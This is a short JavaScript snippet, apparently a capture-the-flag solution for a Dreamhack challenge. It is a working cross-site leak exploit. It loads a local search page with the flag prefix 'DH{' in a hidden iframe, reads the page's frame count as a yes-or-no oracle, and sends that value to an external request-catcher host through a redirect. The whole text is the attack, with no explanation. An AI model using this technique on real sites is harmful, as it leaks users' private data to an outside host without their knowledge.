var iframe = document.createElement("iframe");
iframe.src = "http://127.0.0.1:8000/search?query=DH{";
document.body.appendChild(iframe);
iframe.onload = ()=>{location.href=`https://iqgfdip.request.dreamhack.games/${iframe.contentWindow.frames.length}`};
